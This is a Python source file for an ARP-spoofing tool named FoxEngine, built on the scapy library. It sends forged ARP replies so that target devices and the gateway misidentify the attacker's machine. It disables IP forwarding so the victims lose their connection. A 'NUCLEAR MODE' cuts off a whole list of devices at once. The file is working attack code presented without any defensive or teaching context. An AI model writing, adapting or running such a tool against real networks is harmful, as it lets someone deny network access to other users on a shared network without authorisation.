import scapy.all as scapy
import time
import sys
import os

class FoxEngine:
    def __init__(self, target_ip, gateway_ip):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip

    def get_mac(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
        return None

    def spoof(self, target_ip, spoof_ip):
        target_mac = self.get_mac(target_ip)
        if not target_mac:
            return
        # op=2 means ARP Response. We are telling the target that WE are the gateway.
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    def kill_connection(self):
        # Disable IP Forwarding to kill the internet
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print(f"[*] Attacking: {self.target_ip} <--> {self.gateway_ip}")
        try:
            while True:
                self.spoof(self.target_ip, self.gateway_ip)
                self.spoof(self.gateway_ip, self.target_ip)
                time.sleep(1)
        except KeyboardInterrupt:
            self.restore(self.target_ip, self.gateway_ip)
            print("\n[+] Target Restored.")

    def kill_all(self, target_list):
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print(f"[*] NUCLEAR MODE: Killing {len(target_list)} devices...")
        try:
            while True:
                for target in target_list:
                    self.spoof(target, self.gateway_ip)
                    self.spoof(self.gateway_ip, target)
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[+] Restoring all connections...")
            for target in target_list:
                self.restore(target, self.gateway_ip)

    def restore(self, destination_ip, source_ip):
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        if destination_mac and source_mac:
            packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
            scapy.send(packet, count=4, verbose=False)
